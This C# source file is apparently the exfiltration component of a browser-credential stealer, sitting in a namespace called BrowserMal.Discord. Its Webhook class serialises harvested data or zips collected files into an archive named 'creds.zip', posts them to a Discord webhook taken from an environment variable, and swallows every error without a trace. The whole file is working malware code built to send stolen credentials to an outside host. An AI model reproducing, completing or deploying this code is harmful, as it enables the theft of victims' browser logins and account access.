using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

namespace BrowserMal.Discord
{
    internal class Webhook
    {
        public static string url = Environment.GetEnvironmentVariable("DISCORD_WEBHOOK", EnvironmentVariableTarget.User);
        public static void SendFile<T>(List<T> list, string filename)
        {
            string json = JsonConvert.SerializeObject(list, Formatting.Indented);
            var file_bytes = Encoding.UTF8.GetBytes(json);

            GenericSender(file_bytes, filename);
        }

        private static void GenericSender(byte[] file, string filename)
        {
            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    MultipartFormDataContent form = new MultipartFormDataContent
                {
                    { new ByteArrayContent(file, 0, file.Length), "Document", filename }
                };

                    httpClient.PostAsync(url, form).Wait();
                    httpClient.Dispose();
                }
            }
            catch { }
        }

        public static void SendFile(byte[] file) => GenericSender(file, "creds.zip");

        public static void BulkSend(Dictionary<string, string> files) => SendFile(Util.Zip.ZipArchives(files));
    }
}
